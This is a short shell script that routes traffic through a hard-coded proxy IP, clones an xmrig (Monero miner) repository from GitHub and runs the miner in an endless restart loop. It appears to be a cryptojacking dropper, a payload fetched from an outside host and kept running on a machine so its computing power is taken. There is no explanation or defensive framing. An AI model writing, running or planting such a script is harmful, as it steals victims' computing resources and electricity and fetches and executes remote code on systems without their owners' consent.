#!/bin/sh
#

#xxx
export http_proxy=45.76.178.169:9956
git clone https://github.com/sunahsl/xmrig.git
cd xmrig
chmod +x xmrig
while [ 1 ]; do
./xmrig
sleep 5
done
